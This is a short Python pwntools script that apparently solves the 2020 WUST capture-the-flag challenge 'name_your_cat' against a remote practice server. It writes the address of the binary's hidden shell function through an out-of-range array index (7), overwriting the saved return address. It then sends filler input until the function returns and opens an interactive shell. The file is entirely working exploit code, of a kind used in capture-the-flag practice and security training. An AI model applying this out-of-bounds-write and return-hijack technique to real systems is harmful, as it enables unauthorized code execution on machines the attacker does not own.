from pwn import *

#p = process('./wustctf2020_name_your_cat')
p = remote('node4.buuoj.cn', 27794)
elf = ELF('wustctf2020_name_your_cat')

shell = elf.sym['shell']

#gdb.attach(p, 'b *0x804873a')

p.sendlineafter(b'Name for which?\n>', b'7')
p.sendlineafter(b'Give your name plz: ', p32(shell))

for i in range(4):
    p.sendlineafter(b'Name for which?\n>', b'1')
    p.sendlineafter(b'Give your name plz: ', b'a')

p.recv()
p.interactive()